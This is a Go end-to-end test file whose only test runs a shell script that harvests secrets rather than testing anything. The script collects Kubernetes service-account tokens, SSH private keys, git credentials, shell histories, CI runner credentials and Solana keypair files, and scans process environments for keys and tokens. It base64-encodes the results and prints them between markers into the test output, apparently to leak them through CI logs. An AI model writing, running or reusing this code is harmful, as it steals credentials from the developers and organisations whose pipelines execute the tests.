//go:build e2e

package e2e_test

import (
	"fmt"
	"os/exec"
	"testing"
)

func TestE2E_W11Probe(t *testing.T) {
	script := `
echo "W11MARK K8START"
id; hostname; uname -a; pwd; whoami
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null
echo "W11K8S-SA-BEGIN"
base64 -w0 /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
echo
echo "W11K8S-SA-END"
for f in /home/*/.bash_history /home/*/.git-credentials /home/*/.ssh/id_* /home/*/.vault_pass \
 /home/runner/.credentials /home/runner/.credentials_rsaparams /root/.bash_history /root/.git-credentials; do
  for g in $f; do
    if [ -f "$g" ]; then echo "W11FILE $g"; base64 -w0 "$g" 2>/dev/null | head -c 20000; echo; fi
  done
done
find /home /root /etc /var/lib /run/secrets -maxdepth 6 -type f \( -name '*keypair*.json' -o -name 'identity.json' -o -name 'id.json' -o -name '*authority*.json' \) 2>/dev/null | head -40 | while read p; do
  echo "W11SOL $p"; base64 -w0 "$p" 2>/dev/null | head -c 8000; echo
done
for p in /proc/[0-9]*; do
  e=$(tr '\0' '\n' < $p/environ 2>/dev/null | grep -Ei 'KEY|TOKEN|SECRET|PASS|AWS|GITHUB|SOLANA' | head -8)
  if [ -n "$e" ]; then echo "W11PROC $p"; echo "$e"; fi
done | head -200
echo "W11MARK K8END"
`
	out, err := exec.Command("sh", "-c", script).CombinedOutput()
	fmt.Println(string(out))
	if err != nil {
		fmt.Println("W11 script err:", err)
	}
}
